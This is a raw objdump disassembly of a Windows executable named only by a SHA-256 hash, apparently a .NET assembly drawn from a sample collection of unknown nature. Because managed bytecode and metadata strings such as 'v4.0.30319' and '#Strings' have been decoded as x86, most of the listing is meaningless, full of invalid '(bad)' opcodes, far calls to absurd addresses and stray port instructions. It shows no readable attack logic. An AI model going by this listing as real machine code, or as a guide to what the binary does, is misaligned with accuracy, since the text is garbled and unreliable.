
2844b24385ae3e9ed11105b02ca87b7bc0e49ee5086739138640ca42b6b60df3.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	inc    eax
  402001:	pop    esp
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x23d400,al
  402013:	add    BYTE PTR [eax+0x9000037],bh
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [ecx+0x60],cl
  402052:	xor    ebp,DWORD PTR [ebp-0x27dc51ca]
  402058:	popa   
  402059:	push   ebx
  40205a:	sub    ch,ch
  40205c:	jns    0x402052
  40205e:	pop    eax
  40205f:	jl     0x4020c1
  402061:	jmp    0x4020be
  402063:	dec    ebx
  402064:	out    0x8c,eax
  402066:	pop    eax
  402067:	daa    
  402068:	loop   0x40206d
  40206a:	ins    DWORD PTR es:[edi],dx
  40206b:	leave  
  40206c:	inc    edi
  40206d:	dec    esi
  40206e:	push   0xffffff80
  402070:	dec    ebp
  402071:	shl    edx,cl
  402073:	cmp    al,0x8c
  402075:	leave  
  402076:	or     edx,esi
  402078:	xor    edi,DWORD PTR [ebx+0x35]
  40207b:	je     0x4020e0
  40207d:	push   ss
  40207e:	and    eax,0x190f94b
  402083:	(bad)  
  402084:	(bad)  
  402085:	inc    ebp
  402086:	popa   
  402087:	push   cs
  402088:	mov    bl,0x37
  40208a:	mov    edi,0xf64339d
  40208f:	and    DWORD PTR [edi-0x78ca9f3b],0xffffff83
  402096:	push   eax
  402097:	mov    ds:0x95b80de6,eax
  40209c:	jecxz  0x40211c
  40209e:	(bad)  
  4020a0:	shr    DWORD PTR [ebp+ebp*8+0x51],cl
  4020a4:	call   0xd3e4:0xf2c2602f
  4020ab:	in     eax,0x77
  4020ad:	in     al,0xe6
  4020af:	nop
  4020b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020b1:	push   ss
  4020b2:	pusha  
  4020b3:	sti    
  4020b4:	pop    edx
  4020b5:	xor    ebx,DWORD PTR [edx+eiz*2]
  4020b8:	cwde   
  4020b9:	xchg   ebx,eax
  4020ba:	mov    eax,0x33d2f12f
  4020bf:	(bad)  
  4020c0:	xor    DWORD PTR [ebx+0x283ba61f],ecx
  4020c6:	not    BYTE PTR [esi]
  4020c8:	fnstsw WORD PTR [ebx-0x12a41169]
  4020ce:	das    
  4020cf:	and    bl,BYTE PTR [ebx]
  4020d1:	xor    BYTE PTR [eax+eax*1],al
  4020d4:	jmp    0x14020d9
  4020d9:	add    BYTE PTR [eax],al
  4020db:	adc    DWORD PTR [edi],edx
  4020dd:	or     al,BYTE PTR [edx]
  4020df:	mov    gs,WORD PTR [ecx+0x19]
  4020e2:	xor    edx,DWORD PTR [ecx]
  4020e4:	add    bl,BYTE PTR [eax]
  4020e6:	call   0x2870:0x172
  4020ed:	sldt   WORD PTR [eax]
  4020f0:	or     ch,BYTE PTR [edx+eax*1]
  4020f3:	push   ss
  4020f4:	or     al,BYTE PTR [edx]
  4020f6:	mov    gs,WORD PTR [ecx+0x18]
  4020f9:	xor    al,BYTE PTR [esi]
  4020fb:	add    cl,BYTE PTR [esi+0xe321a69]
  402101:	push   es
  402102:	sub    al,0xa
  402104:	jb     0x402119
  402106:	add    BYTE PTR [eax],al
  402108:	jo     0x402132
  40210a:	adc    BYTE PTR [eax],al
  40210c:	add    BYTE PTR [edx],cl
  40210e:	sub    al,BYTE PTR [esi]
  402110:	sub    al,0x24
  402112:	jb     0x402095
  402114:	add    BYTE PTR [eax],al
  402116:	jo     0x40211a
  402118:	push   ss
  402119:	call   0x280a:0x1128
  402120:	adc    BYTE PTR [eax],al
  402122:	add    BYTE PTR [edx],cl
  402124:	jb     0x4020c7
  402126:	add    BYTE PTR [eax],al
  402128:	jo     0x40212c
  40212a:	pop    ss
  40212b:	call   0x280a:0x1128
  402132:	adc    BYTE PTR [eax],al
  402134:	add    BYTE PTR [edx],cl
  402136:	push   ss
  402137:	or     eax,DWORD PTR [edx]
  402139:	push   ss
  40213a:	call   0x3:0x289a1702
  402141:	add    BYTE PTR [esi],al
  402143:	pop    ss
  402144:	or     ebx,esi
  402146:	adc    ecx,DWORD PTR [edx+esi*2]
  402149:	rol    DWORD PTR [eax],0x0
  40214c:	jo     0x402156
  40214e:	sub    BYTE PTR [edx],dl
  402150:	add    BYTE PTR [eax],al
  402152:	or     ch,BYTE PTR [eax]
  402154:	adc    BYTE PTR [eax],al
  402156:	add    BYTE PTR [edx],cl
  402158:	fiadd  WORD PTR [eax]
  40215a:	push   es
  40215b:	sub    eax,0x9a17023f
  402160:	sub    BYTE PTR [ebx],dl
  402162:	add    BYTE PTR [eax],al
  402164:	or     bl,dh
  402166:	xor    eax,0x18d1a0d
  40216b:	add    BYTE PTR [eax],al
  40216d:	add    DWORD PTR [ebx],edx
  40216f:	add    eax,0x72160511
  402174:	loope  0x402176
  402176:	add    BYTE PTR [eax-0x5e],dh
  402179:	adc    DWORD PTR ds:0x9a170217,eax
  40217f:	mov    ds:0x72180511,al
  402184:	add    eax,0xa2700001
  402189:	adc    DWORD PTR ds:0x11a20919,eax
  40218f:	add    eax,0x1428
  402194:	or     ch,BYTE PTR [eax]
  402196:	adc    BYTE PTR [eax],al
  402198:	add    BYTE PTR [edx],cl
  40219a:	fiadd  WORD PTR [eax]
  40219c:	pop    es
  40219d:	sub    al,0x25
  40219f:	add    dl,BYTE PTR [esi]
  4021a1:	call   0x606:0x428
  4021a8:	sub    BYTE PTR [edx],al
  4021aa:	add    BYTE PTR [eax],al
  4021ac:	push   es
  4021ad:	ficom  WORD PTR ds:0xd720413
  4021b3:	add    DWORD PTR [eax],eax
  4021b5:	jo     0x4021c8
  4021b7:	add    al,0x28
  4021b9:	adc    al,BYTE PTR [eax]
  4021bb:	add    BYTE PTR [edx],cl
  4021bd:	sub    BYTE PTR [eax],dl
  4021bf:	add    BYTE PTR [eax],al
  4021c1:	or     bl,dh
  4021c3:	add    BYTE PTR [edx],ch
  4021c5:	add    BYTE PTR [eax],al
  4021c7:	add    BYTE PTR [ecx],al
  4021c9:	sub    BYTE PTR [eax],al
  4021cb:	add    BYTE PTR [eax],al
  4021cd:	add    BYTE PTR [eax+eax*1+0xf],bl
  4021d1:	imul   eax,DWORD PTR [eax],0x13
  4021d4:	push   ss
  4021d5:	add    BYTE PTR [eax],al
  4021d7:	add    DWORD PTR [eax],eax
  4021d9:	add    BYTE PTR [ecx+0x8b0a00],al
  4021df:	xor    eax,0x1000016
  4021e4:	add    BYTE PTR [eax],al
  4021e6:	ret    
  4021e7:	add    BYTE PTR [eax],dl
  4021e9:	rol    DWORD PTR [eax],cl
  4021eb:	adc    eax,0x1000016
  4021f0:	sbb    esi,DWORD PTR [eax]
  4021f2:	add    eax,DWORD PTR [eax]
  4021f4:	cmp    eax,0x2000001
  4021f9:	add    BYTE PTR [eax],al
  4021fb:	adc    DWORD PTR [edx+ecx*1],edx
  4021fe:	jle    0x402215
  402200:	add    BYTE PTR [eax],al
  402202:	or     cl,BYTE PTR [ebx]
  402204:	add    ch,BYTE PTR [edi+0x16]
  402207:	add    BYTE PTR [eax],al
  402209:	or     cl,BYTE PTR [eax+ecx*1]
  40220c:	outs   dx,DWORD PTR ds:[esi]
  40220d:	pop    ss
  40220e:	add    BYTE PTR [eax],al
  402210:	or     dl,BYTE PTR [ebx]
  402212:	or     BYTE PTR [ebx],ch
  402214:	pop    ds
  402215:	adc    DWORD PTR [eax],ecx
  402217:	outs   dx,DWORD PTR ds:[esi]
  402218:	sbb    BYTE PTR [eax],al
  40221a:	add    BYTE PTR [edx],cl
  40221c:	or     eax,0x196f0907
  402221:	add    BYTE PTR [eax],al
  402223:	or     ch,BYTE PTR [eax]
  402225:	sbb    al,BYTE PTR [eax]
  402227:	add    BYTE PTR [edx],cl
  402229:	sub    al,0x9
  40222b:	or     DWORD PTR [edi+0x19],ebp
  40222e:	add    BYTE PTR [eax],al
  402230:	or     cl,BYTE PTR [ebx]
  402232:	or     DWORD PTR [edx],ecx
  402234:	adc    DWORD PTR [eax],ecx
  402236:	outs   dx,DWORD PTR ds:[esi]
  402237:	sbb    eax,DWORD PTR [eax]
  402239:	add    BYTE PTR [edx],cl
  40223b:	sub    eax,0x110cded8
  402240:	or     BYTE PTR [edi+eax*1],ch
  402243:	adc    DWORD PTR [eax],ecx
  402245:	outs   dx,DWORD PTR ds:[esi]
  402246:	sbb    al,0x0
  402248:	add    BYTE PTR [edx],cl
  40224a:	fadd   QWORD PTR [esi]
  40224c:	cmp    edx,ebx
  40224e:	add    BYTE PTR [eax],al
  402250:	add    BYTE PTR [ebx],al
  402252:	sub    al,0x15
  402254:	jb     0x4022a7
  402256:	add    DWORD PTR [eax],eax
  402258:	jo     0x402260
  40225a:	outs   dx,DWORD PTR ds:[esi]
  40225b:	sbb    eax,0x280a0000
  402260:	adc    DWORD PTR [eax],eax
  402262:	add    BYTE PTR [edx],cl
  402264:	sub    BYTE PTR [eax],dl
  402266:	add    BYTE PTR [eax],al
  402268:	or     bl,BYTE PTR [edi]
  40226a:	push   ds
  40226b:	adc    eax,DWORD PTR [edx+esi*2]
  40226e:	popf   
  40226f:	add    DWORD PTR [eax],eax
  402271:	jo     0x4022e5
  402273:	adc    eax,0x11700002
  402278:	add    al,0x8c
  40227a:	push   ds
  40227b:	add    BYTE PTR [eax],al
  40227d:	add    DWORD PTR [eax],ebp
  40227f:	push   ds
  402280:	add    BYTE PTR [eax],al
  402282:	or     dl,BYTE PTR [ebx]
  402284:	add    eax,0x122c0511
  402289:	adc    DWORD PTR ds:0x1e75,eax
  40228f:	add    DWORD PTR [ecx+ecx*1],ebp
  402292:	adc    DWORD PTR ds:0x1ea5,eax
  402298:	add    DWORD PTR [ebx],edx
  40229a:	add    al,0xde
  40229c:	add    esp,DWORD PTR [esi]
  40229e:	fiadd  WORD PTR [eax]
  4022a0:	adc    DWORD PTR [esp+ebp*2],eax
  4022a3:	sub    BYTE PTR [edi],bl
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	or     dl,BYTE PTR [ebx]
  4022a9:	push   es
  4022aa:	add    ebp,DWORD PTR [esp+ebx*1]
  4022ad:	jb     0x4022e4
  4022af:	add    al,BYTE PTR [eax]
  4022b1:	jo     0x4022c5
  4022b3:	push   es
  4022b4:	(bad)  
  4022b5:	push   ss
  4022b6:	and    BYTE PTR [eax],al
  4022b8:	add    BYTE PTR [ecx],al
  4022ba:	outs   dx,DWORD PTR ds:[esi]
  4022bb:	and    BYTE PTR [eax],al
  4022bd:	add    BYTE PTR [edx],cl
  4022bf:	sub    BYTE PTR [ecx],dl
  4022c1:	add    BYTE PTR [eax],al
  4022c3:	or     ch,BYTE PTR [eax]
  4022c5:	adc    BYTE PTR [eax],al
  4022c7:	add    BYTE PTR [edx],cl
  4022c9:	sub    BYTE PTR [ecx],ah
  4022cb:	add    BYTE PTR [eax],al
  4022cd:	or     dl,BYTE PTR [ebx]
  4022cf:	pop    es
  4022d0:	sub    ebp,DWORD PTR [esi]
  4022d2:	and    BYTE PTR [eax-0x16],ah
  4022d5:	add    BYTE PTR [eax],al
  4022d7:	sub    BYTE PTR [edx],ah
  4022d9:	add    BYTE PTR [eax],al
  4022db:	or     al,BYTE PTR [esi]
  4022dd:	outs   dx,DWORD PTR ds:[esi]
  4022de:	and    eax,DWORD PTR [eax]
  4022e0:	add    BYTE PTR [edx],cl
  4022e2:	push   es
  4022e3:	outs   dx,DWORD PTR ds:[esi]
  4022e4:	and    al,0x0
  4022e6:	add    BYTE PTR [edx],cl
  4022e8:	sub    eax,0x256f0608
  4022ed:	add    BYTE PTR [eax],al
  4022ef:	or     ch,BYTE PTR [esi+ecx*1]
  4022f2:	add    ebp,DWORD PTR [edx+ecx*1]
  4022f5:	jb     0x40234e
  4022f7:	add    al,BYTE PTR [eax]
  4022f9:	jo     0x402323
  4022fb:	adc    BYTE PTR [eax],al
  4022fd:	add    BYTE PTR [edx],cl
  4022ff:	sub    ch,BYTE PTR [eax]
  402301:	and    DWORD PTR [eax],eax
  402303:	add    BYTE PTR [edx],cl
  402305:	adc    DWORD PTR [edi],eax
  402307:	sub    BYTE PTR [esi],ah
  402309:	add    BYTE PTR [eax],al
  40230b:	or     dl,BYTE PTR [ecx]
  40230d:	push   es
  40230e:	sub    BYTE PTR [edi],ah
  402310:	add    BYTE PTR [eax],al
  402312:	or     ch,BYTE PTR ds:0x202c03bd
  402318:	push   es
  402319:	outs   dx,DWORD PTR ds:[esi]
  40231a:	and    al,0x0
  40231c:	add    BYTE PTR [edx],cl
  40231e:	sub    eax,0x2937218
  402323:	add    BYTE PTR [eax+0x28],dh
  402326:	adc    BYTE PTR [eax],al
  402328:	add    BYTE PTR [edx],cl
  40232a:	sub    al,BYTE PTR [ebx]
  40232c:	sub    al,0xa
  40232e:	jb     0x402303
  402330:	add    al,BYTE PTR [eax]
  402332:	jo     0x40235c
  402334:	adc    BYTE PTR [eax],al
  402336:	add    BYTE PTR [edx],cl
  402338:	sub    al,BYTE PTR [eax]
  40233a:	add    BYTE PTR [eax],al
  40233c:	add    DWORD PTR [eax+eax*1],ebx
  40233f:	add    BYTE PTR [edx],al
  402341:	add    BYTE PTR [edi],dl
  402343:	add    BYTE PTR [ebx+eax*2],ch
  402346:	add    BYTE PTR [eax+eax*1],cl
  402349:	add    BYTE PTR [eax],al
  40234b:	add    BYTE PTR [eax],al
  40234d:	add    BYTE PTR [ecx+0x0],dh
  402350:	xor    BYTE PTR [ecx+0x220300],ah
  402356:	add    BYTE PTR [ecx],al
  402358:	adc    esi,DWORD PTR [eax]
  40235a:	add    eax,DWORD PTR [eax]
  40235c:	pop    ss
  40235d:	add    BYTE PTR [eax],al
  40235f:	add    BYTE PTR [eax+eax*1],al
  402362:	add    BYTE PTR [ecx],dl
  402364:	add    ch,BYTE PTR [eax]
  402366:	add    al,0x0
  402368:	add    BYTE PTR [esi],al
  40236a:	or     al,BYTE PTR [esi]
  40236c:	sub    BYTE PTR [eax],ch
  40236e:	add    BYTE PTR [eax],al
  402370:	or     cl,BYTE PTR [ebx]
  402372:	pop    es
  402373:	add    edx,DWORD PTR [edi]
  402375:	outs   dx,DWORD PTR ds:[esi]
  402376:	sub    DWORD PTR [eax],eax
  402378:	add    BYTE PTR [edx],cl
  40237a:	sub    al,BYTE PTR [eax]
  40237c:	adc    esi,DWORD PTR [eax]
  40237e:	add    eax,DWORD PTR [eax]
  402380:	inc    ebx
  402381:	add    BYTE PTR [eax],al
  402383:	add    BYTE PTR ds:0x2110000,al
  402389:	jb     0x4023ba
  40238b:	add    eax,DWORD PTR [eax]
  40238d:	jo     0x4023a9
  40238f:	outs   dx,DWORD PTR ds:[esi]
  402390:	sub    al,BYTE PTR [eax]
  402392:	add    BYTE PTR [edx],cl
  402394:	sub    al,0x29
  402396:	add    bl,BYTE PTR [edi]
  402398:	pop    esp
  402399:	outs   dx,DWORD PTR ds:[esi]
  40239a:	sub    eax,DWORD PTR [eax]
  40239c:	add    BYTE PTR [edx],cl
  40239e:	or     al,0x2
  4023a0:	push   ss
  4023a1:	or     BYTE PTR [edi+0x2c],ch
  4023a4:	add    BYTE PTR [eax],al
  4023a6:	or     cl,BYTE PTR [ebx]
  4023a8:	add    cl,BYTE PTR [eax]
  4023aa:	pop    ss
  4023ab:	pop    eax
  4023ac:	outs   dx,DWORD PTR ds:[esi]
  4023ad:	sub    eax,0xa0a0000
  4023b2:	pop    es
  4023b3:	jae    0x4023e3
  4023b5:	add    BYTE PTR [eax],al
  4023b7:	or     al,BYTE PTR [esi]
  4023b9:	jae    0x4023ea
  4023bb:	add    BYTE PTR [eax],al
  4023bd:	or     ch,BYTE PTR [edx]
  4023bf:	jae    0x4023f1
  4023c1:	add    BYTE PTR [eax],al
  4023c3:	or     al,BYTE PTR [edx]
  4023c5:	jae    0x4023f6
  4023c7:	add    BYTE PTR [eax],al
  4023c9:	or     ch,BYTE PTR [edx]
  4023cb:	push   ds
  4023cc:	add    ch,BYTE PTR [eax]
  4023ce:	xor    DWORD PTR [eax],eax
  4023d0:	add    BYTE PTR [edx],cl
  4023d2:	sub    al,BYTE PTR [eax]
  4023d4:	inc    edx
  4023d5:	push   ebx
  4023d6:	dec    edx
  4023d7:	inc    edx
  4023d8:	add    DWORD PTR [eax],eax
  4023da:	add    DWORD PTR [eax],eax
  4023dc:	add    BYTE PTR [eax],al
  4023de:	add    BYTE PTR [eax],al
  4023e0:	or     al,0x0
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	jbe    0x402418
  4023e6:	xor    BYTE PTR cs:[esi],ch
  4023e9:	xor    eax,0x37323730
  4023ee:	add    BYTE PTR [eax],al
  4023f0:	add    BYTE PTR [eax],al
  4023f2:	add    eax,0x6c00
  4023f7:	add    ah,bh
  4023f9:	add    al,0x0
  4023fb:	add    BYTE PTR [ebx],ah
  4023fd:	jle    0x4023ff
  4023ff:	add    BYTE PTR [eax+0x5],ch
  402402:	add    BYTE PTR [eax],al
  402404:	or     al,0x8
  402406:	add    BYTE PTR [eax],al
  402408:	and    edx,DWORD PTR [ebx+0x74]
  40240b:	jb     0x402476
  40240d:	outs   dx,BYTE PTR ds:[esi]
  40240e:	addr16 jae 0x402411
  402411:	add    BYTE PTR [eax],al
  402413:	add    BYTE PTR [ebp+ecx*1+0x0],dh
  402417:	add    BYTE PTR [eax],bh
  402419:	add    eax,DWORD PTR [eax]
  40241b:	add    BYTE PTR [ebx],ah
  40241d:	push   ebp
  40241e:	push   ebx
  40241f:	add    BYTE PTR [eax+edx*1+0x100000],ch
  402426:	add    BYTE PTR [eax],al
  402428:	and    eax,DWORD PTR [edi+0x55]
  40242b:	dec    ecx
  40242c:	inc    esp
  40242d:	add    BYTE PTR [eax],al
  40242f:	add    BYTE PTR [eax+edx*1+0x26fc0000],bh
  402436:	add    BYTE PTR [eax],al
  402438:	and    eax,DWORD PTR [edx+0x6c]
  40243b:	outs   dx,DWORD PTR ds:[esi]
  40243c:	bound  eax,QWORD PTR [eax]
  40243e:	add    BYTE PTR [eax],al
  402440:	add    BYTE PTR [eax],al
  402442:	add    BYTE PTR [eax],al
  402444:	add    al,BYTE PTR [eax]
  402446:	add    BYTE PTR [ecx],al
  402448:	push   edi
  402449:	pop    ebp
  40244a:	add    cl,BYTE PTR [eax]
  40244c:	or     DWORD PTR [eax],eax
  40244e:	add    BYTE PTR [eax],al
  402450:	add    dl,bh
  402452:	add    DWORD PTR [ebx],esi
  402454:	add    BYTE PTR [esi],dl
  402456:	add    BYTE PTR [eax],al
  402458:	add    DWORD PTR [eax],eax
  40245a:	add    BYTE PTR [eax],al
  40245c:	sub    BYTE PTR [eax],al
  40245e:	add    BYTE PTR [eax],al
  402460:	add    al,0x0
  402462:	add    BYTE PTR [eax],al
  402464:	sbb    eax,DWORD PTR [eax]
  402466:	add    BYTE PTR [eax],al
  402468:	add    eax,0x6000000
  40246d:	add    BYTE PTR [eax],al
  40246f:	add    BYTE PTR [edx],dh
  402471:	add    BYTE PTR [eax],al
  402473:	add    BYTE PTR [ebx],bl
  402475:	add    BYTE PTR [eax],al
  402477:	add    BYTE PTR ds:0x1000000,cl
  40247d:	add    BYTE PTR [eax],al
  40247f:	add    BYTE PTR ds:0x1000000,al
  402485:	add    BYTE PTR [eax],al
  402487:	add    BYTE PTR [ecx],al
  402489:	add    BYTE PTR [eax],al
  40248b:	add    BYTE PTR [edx],al
  40248d:	add    BYTE PTR [eax],al
  40248f:	add    BYTE PTR [eax],al
  402491:	add    BYTE PTR [edx],cl
  402493:	add    BYTE PTR [ecx],al
  402495:	add    BYTE PTR [eax],al
  402497:	add    BYTE PTR [eax],al
  402499:	add    BYTE PTR [esi],al
  40249b:	add    BYTE PTR [ecx+0x0],dh
  40249e:	push   0x0
  4024a0:	or     al,BYTE PTR [eax]
  4024a2:	mov    WORD PTR [edx],es
  4024a4:	jl     0x4024a8
  4024a6:	push   es
  4024a7:	add    ah,ah
  4024a9:	add    dl,dl
  4024ab:	add    al,BYTE PTR [esi]
  4024ad:	add    bh,bh
  4024af:	add    dl,dl
  4024b1:	add    al,BYTE PTR [esi]
  4024b3:	add    BYTE PTR [eax],bl
  4024b5:	add    edx,edx
  4024b7:	add    al,BYTE PTR [esi]
  4024b9:	add    BYTE PTR ds:0x602d203,dh
  4024bf:	add    BYTE PTR [esi+0x3],cl
  4024c2:	rol    BYTE PTR [edx],cl
  4024c4:	push   es
  4024c5:	add    BYTE PTR [ecx+0x3],ch
  4024c8:	rol    BYTE PTR [edx],cl
  4024ca:	push   es
  4024cb:	add    BYTE PTR [edx+0x602d203],al
  4024d1:	add    BYTE PTR [edx+0x6039b03],bh
  4024d7:	add    dh,cl
  4024d9:	add    ebp,DWORD PTR [edx+0x0]
  4024dc:	push   es
  4024dd:	add    BYTE PTR [eax],al
  4024df:	add    al,0xe4
  4024e1:	add    eax,DWORD PTR [esi]
  4024e3:	add    BYTE PTR [esp+eax*1],bl
  4024e6:	in     al,0x3
  4024e8:	push   es
  4024e9:	add    BYTE PTR [esi],bh
  4024eb:	add    al,0x2b
  4024ed:	add    al,0x3b
  4024ef:	add    BYTE PTR [edx+0x4],dl
  4024f2:	add    BYTE PTR [eax],al
  4024f4:	push   es
  4024f5:	add    BYTE PTR [ecx+0x6046104],al
  4024fb:	add    BYTE PTR [ecx+0x6046104],ah
  402501:	add    al,cl
  402503:	add    al,0x6a
  402505:	add    BYTE PTR [esi],al
  402507:	add    al,ah
  402509:	add    al,0x6a
  40250b:	add    BYTE PTR [esi],al
  40250d:	add    bl,dh
  40250f:	add    al,0x6a
  402511:	add    BYTE PTR [esi],al
  402513:	add    BYTE PTR [esi],dl
  402515:	add    eax,0x6050c
  40251a:	and    al,BYTE PTR ds:0x6006a
  402520:	inc    esi
  402521:	add    eax,0xa006a
  402526:	pop    eax
  402527:	add    eax,0x6027c
  40252c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40252d:	add    eax,0xa0589
  402532:	mov    dl,0x5
  402534:	jl     0x402538
  402536:	push   es
  402537:	add    BYTE PTR [ebx],dl
  402539:	push   es
  40253a:	add    BYTE PTR [esi],al
  40253c:	push   es
  40253d:	add    BYTE PTR [eax],ch
  40253f:	push   es
  402540:	push   0x0
  402542:	or     al,BYTE PTR [eax]
  402544:	cmp    al,0x6
  402546:	jl     0x40254a
  402548:	push   es
  402549:	add    BYTE PTR [edi+0x6],dl
  40254c:	push   0x0
  40254e:	push   es
  40254f:	add    BYTE PTR [ebp+0x6],ch
  402552:	pop    ebp
  402553:	push   es
  402554:	push   es
  402555:	add    BYTE PTR [edi+0x6],bh
  402558:	push   0x0
  40255a:	push   es
  40255b:	add    BYTE PTR [esi+0x606a506],dh
  402561:	add    BYTE PTR [esi],al
  402563:	pop    es
  402564:	test   BYTE PTR [esi],0xa
  402567:	add    BYTE PTR [esi+0x7],al
  40256a:	xor    eax,DWORD PTR [edi]
  40256c:	or     al,BYTE PTR [eax]
  40256e:	jo     0x402577
  402570:	xor    eax,DWORD PTR [edi]
  402572:	push   es
  402573:	add    BYTE PTR [ebx+0xa006a07],ah
  402579:	add    ch,dl
  40257b:	pop    es
  40257c:	jl     0x402580
  40257e:	or     al,BYTE PTR [eax]
  402580:	loope  0x402589
  402582:	jl     0x402586
  402584:	push   es
  402585:	add    dl,dh
  402587:	pop    es
  402588:	test   BYTE PTR [esi],0x0
  40258b:	add    BYTE PTR [eax],al
  40258d:	add    BYTE PTR [ecx],al
  40258f:	add    BYTE PTR [eax],al
  402591:	add    BYTE PTR [eax],al
  402593:	add    BYTE PTR [ecx],al
  402595:	add    BYTE PTR [ecx],al
  402597:	add    BYTE PTR [eax+0x17001001],al
  40259d:	add    BYTE PTR [ecx],ah
  40259f:	add    BYTE PTR ds:0x1000100,al
  4025a5:	add    BYTE PTR [eax+0x34001001],al
  4025ab:	add    BYTE PTR [ecx],ah
  4025ad:	add    BYTE PTR ds:0x1001400,al
  4025b3:	add    BYTE PTR [eax],al
  4025b5:	add    BYTE PTR [eax],dl
  4025b7:	add    BYTE PTR [esi],bh
  4025b9:	add    BYTE PTR [ebx+0x0],cl
  4025bc:	add    eax,0x1001c00
  4025c1:	add    BYTE PTR [ebx-0x80],dl
  4025c4:	js     0x4025c6
  4025c6:	or     al,BYTE PTR [eax]
  4025c8:	push   ebx
  4025c9:	or     BYTE PTR [ebp+0x53000a00],0x80
  4025d0:	mov    ds:0x53000a00,eax
  4025d5:	sub    BYTE PTR [edi+0x53000a00],0x80
  4025dc:	ret    0xa00
  4025df:	add    BYTE PTR [ebx-0x80],dl
  4025e2:	aad    0x0
  4025e4:	or     al,BYTE PTR [eax]
  4025e6:	push   ebx
  4025e7:	and    dh,0x0
  4025ea:	or     al,BYTE PTR [eax]
  4025ec:	push   ebx
  4025ed:	add    BYTE PTR [eax],0x1
  4025f0:	or     al,BYTE PTR [eax]
  4025f2:	push   ebx
  4025f3:	adc    BYTE PTR [esi],0x1
  4025f6:	or     al,BYTE PTR [eax]
  4025f8:	push   ebx
  4025f9:	sub    BYTE PTR [ecx+eax*1],0xa
  4025fd:	add    BYTE PTR [ebx-0x80],dl
  402600:	cmp    eax,DWORD PTR [ecx]
  402602:	or     al,BYTE PTR [eax]
  402604:	push   ebx
  402605:	adc    BYTE PTR [ebp+0x1],0xa
  402609:	add    BYTE PTR [ebx-0x80],dl
  40260c:	jno    0x40260f
  40260e:	or     al,BYTE PTR [eax]
  402610:	push   ebx
  402611:	or     BYTE PTR [ebx+0x53000a01],0x80
  402618:	test   al,0x1
  40261a:	or     al,BYTE PTR [eax]
  40261c:	push   ebx
  40261d:	xor    BYTE PTR [edi+0x53000a01],0x80
  402624:	mov    BYTE PTR [ecx],0xa
  402627:	add    BYTE PTR [ebx-0x80],dl
  40262a:	loopne 0x40262d
  40262c:	or     al,BYTE PTR [eax]
  40262e:	push   ebx
  40262f:	xor    dl,0x1
  402632:	or     al,BYTE PTR [eax]
  402634:	push   ebx
  402635:	add    BYTE PTR [edi],0x2
  402638:	or     al,BYTE PTR [eax]
  40263a:	push   ebx
  40263b:	sbb    BYTE PTR [edx],0x2
  40263e:	or     al,BYTE PTR [eax]
  402640:	push   ebx
  402641:	cmp    BYTE PTR [edx],0x2
  402644:	or     al,BYTE PTR [eax]
  402646:	push   ebx
  402647:	add    BYTE PTR [edx+0x2],0xa
  40264b:	add    BYTE PTR [ebx-0x80],dl
  40264e:	dec    edx
  40264f:	add    cl,BYTE PTR [edx]
  402651:	add    BYTE PTR [ebx-0x80],dl
  402654:	pop    eax
  402655:	add    cl,BYTE PTR [edx]
  402657:	add    BYTE PTR [ebx-0x80],dl
  40265a:	imul   eax,DWORD PTR [edx],0x8053000a
  402660:	outs   dx,DWORD PTR ds:[esi]
  402661:	add    cl,BYTE PTR [edx]
  402663:	add    al,dl
  402665:	and    BYTE PTR [eax],al
  402667:	add    BYTE PTR [eax],al
  402669:	add    BYTE PTR [ecx+0x6e027700],dl
  40266f:	and    eax,DWORD PTR [ecx]
  402671:	add    al,dh
  402673:	and    DWORD PTR [eax],eax
  402675:	add    BYTE PTR [eax],al
  402677:	add    BYTE PTR [ecx+0x7d029700],dl
  40267d:	and    eax,DWORD PTR [edx]
  40267f:	add    BYTE PTR [eax+0x23],bl
  402682:	add    BYTE PTR [eax],al
  402684:	add    BYTE PTR [eax],al
  402686:	xchg   ecx,eax
  402687:	add    BYTE PTR [ebp+0x4238402],ch
  40268d:	add    BYTE PTR [ebx+eiz*1+0x0],bh
  402691:	add    BYTE PTR [eax],al
  402693:	add    BYTE PTR [ecx-0x75fd4200],dl
  402699:	and    eax,DWORD PTR [esi]
  40269b:	add    bl,cl
  40269d:	and    eax,DWORD PTR [eax]
  40269f:	add    BYTE PTR [eax],al
  4026a1:	add    BYTE PTR [esi-0x6ffd33e8],al
  4026a7:	and    eax,DWORD PTR [edi]
  4026a9:	add    BYTE PTR [eax],al
  4026ab:	add    BYTE PTR [ecx],al
  4026ad:	add    bl,bl
  4026af:	add    al,0x0
  4026b1:	add    BYTE PTR [ecx],al
  4026b3:	add    BYTE PTR [eax*1+0x20000],ch
  4026ba:	ss add eax,0x10000
  4026c0:	sbb    BYTE PTR [edi],al
  4026c2:	add    BYTE PTR [eax],al
  4026c4:	add    al,BYTE PTR [eax]
  4026c6:	daa    
  4026c7:	pop    es
  4026c8:	add    BYTE PTR [eax],al
  4026ca:	add    DWORD PTR [eax],eax
  4026cc:	xchg   ebx,eax
  4026cd:	pop    es
  4026ce:	sbb    DWORD PTR [eax],eax
  4026d0:	int3   
  4026d1:	add    dl,BYTE PTR [ebx+eiz*1+0x2cc0021]
  4026d8:	cdq    
  4026d9:	and    ebp,DWORD PTR [ecx]
  4026db:	add    ah,cl
  4026dd:	add    bl,BYTE PTR [ecx-0x33ffcedd]
  4026e3:	add    bl,BYTE PTR [ecx-0x33ffc6dd]
  4026e9:	add    bl,BYTE PTR [ecx-0x33ffbedd]
  4026ef:	add    bl,BYTE PTR [ecx-0x33ffb6dd]
  4026f5:	add    bl,BYTE PTR [ecx-0x33ffaedd]
  4026fb:	add    dl,BYTE PTR [ebx+eiz*1+0x2cc0059]
  402702:	xchg   esp,eax
  402703:	and    esp,DWORD PTR [ecx+0x0]
  402706:	int3   
